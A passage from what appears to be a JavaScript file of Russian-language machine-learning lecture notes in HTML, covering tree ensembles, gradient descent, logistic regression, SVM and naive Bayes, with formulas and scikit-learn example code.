<tr><td><b>Стекинг</b></td><td>метамодель обучается на прогнозах базовых моделей</td><td>обе составляющие</td><td>блендинг, стекинг с out-of-fold прогнозами</td></tr>
</table>
<p><b>Случайный лес:</b> к бутстрапу добавляется случайный отбор подмножества признаков в каждом узле — деревья декоррелируются. Даёт оценку важности признаков и out-of-bag оценку качества без отдельной валидации, легко распараллеливается, почти не переобучается с ростом числа деревьев.</p>
<p><b>Градиентный бустинг:</b> каждое следующее дерево обучается на <b>антиградиенте функции потерь</b> (для MSE — на остатках). Ключевые гиперпараметры: число деревьев, темп обучения (learning rate), глубина, регуляризация, доля подвыборки. Малый темп обучения при большом числе деревьев обычно даёт лучшее качество. Это лидирующий метод для табличных данных; CatBoost дополнительно корректно обрабатывает категориальные признаки.</p>

<h3>Код</h3>
<pre><code>import numpy as np
from sklearn.datasets import load_wine
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.tree import DecisionTreeClassifier, export_text
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier

X, y = load_wine(return_X_y=True)
names = load_wine().feature_names
Xtr, Xte, ytr, yte = train_test_split(X, y, stratify=y, random_state=0)

tree = DecisionTreeClassifier(max_depth=3, criterion='gini', random_state=0).fit(Xtr, ytr)
print(export_text(tree, feature_names=names)[:400])       # интерпретируемые правила
print('дерево :', round(tree.score(Xte, yte), 3))

rf = RandomForestClassifier(n_estimators=500, max_features='sqrt',
                            oob_score=True, random_state=0).fit(Xtr, ytr)
print('лес    :', round(rf.score(Xte, yte), 3), 'OOB:', round(rf.oob_score_, 3))

gb = GradientBoostingClassifier(n_estimators=300, learning_rate=0.05,
                                max_depth=3, random_state=0).fit(Xtr, ytr)
print('бустинг:', round(gb.score(Xte, yte), 3))

# важность признаков
imp = sorted(zip(names, rf.feature_importances_), key=lambda t: -t[1])[:5]
for n, v in imp: print(f'{n:28s} {v:.3f}')</code></pre>
`});

T.push({b:2,n:17,t:"Градиентные алгоритмы. Логистическая регрессия, SVM, наивный Байес",
s:"Оптимизация и линейные модели",
h:`
<h3>Градиентный спуск</h3>
<p>Общая схема обучения: параметры сдвигаются в сторону антиградиента функции потерь.</p>
<div class="f">θ<sub>t+1</sub> = θ<sub>t</sub> − η·∇<sub>θ</sub>L(θ<sub>t</sub>)</div>
<table>
<tr><th>Вариант</th><th>Особенности</th></tr>
<tr><td>Полный (batch)</td><td>градиент по всей выборке: точно, но дорого</td></tr>
<tr><td>Стохастический (SGD)</td><td>по одному объекту: шумно, но быстро и помогает выходить из плохих минимумов</td></tr>
<tr><td>Мини-батчевый</td><td>компромисс, стандарт в глубоком обучении</td></tr>
<tr><td>Momentum, Nesterov</td><td>накопление инерции, сглаживание колебаний в оврагах</td></tr>
<tr><td>AdaGrad, RMSProp, <b>Adam</b></td><td>адаптивный шаг для каждого параметра; Adam — момент + масштабирование</td></tr>
</table>
<p><b>Практика:</b> обязательна нормировка признаков (иначе поверхность потерь вытянута и сходимость медленная); расписание темпа обучения; ранняя остановка. Для выпуклых задач гарантируется глобальный минимум, для нейросетей — только локальный.</p>

<h3>Логистическая регрессия</h3>
<div class="f">p(y = 1 | x) = σ(wᵀx + b),  σ(z) = 1 / (1 + e<sup>−z</sup>)</div>
<div class="f">Потери (log loss): L = −(1/n)Σ [ y·ln p + (1 − y)·ln(1 − p) ]</div>
<p>Это линейный классификатор, дающий <b>калиброванные вероятности</b>. Обучается методом максимального правдоподобия, задача выпуклая. Регуляризация L2 (сжатие весов) и L1 (отбор признаков, разреженность). Интерпретация: exp(w<sub>j</sub>) — во сколько раз меняется отношение шансов при росте признака на единицу. Многоклассовый вариант — softmax-регрессия.</p>

<h3>Метод опорных векторов (SVM)</h3>
<p>Строит разделяющую гиперплоскость с <b>максимальным зазором</b> (margin) между классами: чем шире полоса, тем лучше обобщение. Объекты на границе полосы — <b>опорные векторы</b>, только они определяют решение.</p>
<div class="f">min ‖w‖²/2 + C·Σξ<sub>i</sub>  при y<sub>i</sub>(wᵀx<sub>i</sub> + b) ≥ 1 − ξ<sub>i</sub>, ξ<sub>i</sub> ≥ 0</div>
<p>Параметр C регулирует компромисс между шириной зазора и числом нарушений (мягкий зазор). <b>Ядровой трюк:</b> замена скалярного произведения на ядро K(x, x') позволяет строить нелинейные границы без явного перехода в пространство высокой размерности (ядра: линейное, полиномиальное, RBF, сигмоидное). Функция потерь — hinge loss. Требует масштабирования признаков; плохо масштабируется на очень больших выборках (сложность между O(n²) и O(n³)).</p>

<h3>Наивный байесовский классификатор</h3>
<div class="f">P(c | x) ∝ P(c)·Π<sub>j</sub> P(x<sub>j</sub> | c)</div>
<p>Прямое применение формулы Байеса с «наивным» предположением об условной независимости признаков при известном классе. Прогноз — класс с максимальной апостериорной вероятностью. Разновидности: мультиномиальный (тексты, счётчики слов), бернуллиевский (бинарные признаки), гауссовский (непрерывные). Сглаживание Лапласа устраняет нулевые вероятности для не встречавшихся значений.</p>
<p><b>Достоинства:</b> обучение за один проход по данным, работа на малых выборках и очень высоких размерностях, классический базовый метод для спам-фильтрации и классификации текстов. <b>Недостаток:</b> предположение независимости на практике нарушается, вероятности плохо калиброваны (хотя порядок классов часто верен).</p>

<h3>Код</h3>
<pre><code>import numpy as np
from sklearn.datasets import make_classification
from sklearn.model_selection import train_test_split
from sklearn.pipeline import make_pipeline
from sklearn.preprocessing import StandardScaler
from sklearn.linear_model import LogisticRegression, SGDClassifier
from sklearn.svm import SVC
from sklearn.naive_bayes import GaussianNB

X, y = make_classification(n_samples=3000, n_features=20, n_informative=8, random_state=0)
Xtr, Xte, ytr, yte = train_test_split(X, y, stratify=y, random_state=0)

for name, model in [
    ('логистическая', make_pipeline(StandardScaler(), LogisticRegression(C=1.0, max_iter=1000))),
    ('SGD + hinge  ', make_pipeline(StandardScaler(), SGDClassifier(loss='hinge', alpha=1e-4))),
    ('SVM (RBF)    ', make_pipeline(StandardScaler(), SVC(C=1.0, kernel='rbf', gamma='scale'))),
    ('наивный Байес', GaussianNB()),
]:
    model.fit(Xtr, ytr)
    print(name, round(model.score(Xte, yte), 4))

# градиентный спуск вручную для логистической регрессии
def fit_logreg(X, y, lr=0.1, epochs=300, l2=1e-3):
    X = np.c_[np.ones(len(X)), (X - X.mean(0)) / X.std(0)]     # нормировка + свободный член
    w = np.zeros(X.shape[1])
    for _ in range(epochs):
        p = 1 / (1 + np.exp(-X @ w))
        grad = X.T @ (p - y) / len(y) + l2 * np.r_[0, w[1:]]   # градиент log loss + L2
        w -= lr * grad
    return w

w = fit_logreg(Xtr, ytr)
Xte_n = np.c_[np.ones(len(Xte)), (Xte - Xtr.mean(0)) / Xtr.std(0)]
print('своя реализация:', round((( 1/(1+np.exp(-Xte_n @ w)) &gt; .5) == yte).mean(), 4))</code></pre>
`});

T.push({b:2,n:18,t:"Нейронные сети: архитектура и особенности",
